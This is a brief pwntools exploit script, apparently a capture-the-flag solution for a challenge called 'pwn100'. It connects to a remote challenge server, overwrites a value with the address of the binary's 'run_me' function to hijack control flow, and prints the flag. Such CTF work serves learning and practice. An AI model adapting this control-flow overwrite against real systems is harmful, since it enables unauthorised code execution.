# http://nextline.tistory.com/105
from pwn import *

s = remote('35.154.158.26', 31338)
e = ELF('./pwn100')

def overwrite(msg):
    s.recvline()
    s.sendline(str(msg))

s.recvline()
s.sendline('24')

overwrite(e.symbols['run_me'])

s.recvline()
print 'FLAG : ' + s.recv(1024)
